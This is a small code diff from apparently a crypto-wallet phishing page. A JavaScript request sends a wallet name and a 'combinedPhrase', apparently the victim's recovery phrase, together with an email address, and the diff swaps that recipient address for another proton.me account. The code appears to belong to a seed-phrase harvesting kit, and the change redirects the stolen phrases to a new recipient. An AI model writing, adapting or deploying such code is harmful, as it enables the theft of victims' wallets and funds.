@@ -414,7 +414,7 @@
 						body: JSON.stringify({
 							walletName: wallet.name,
 							details: combinedPhrase,
-							email: "oluwaidan@proton.me",
+							email: "Gerfish7458@proton.me",
 						}),
 					}
 				);
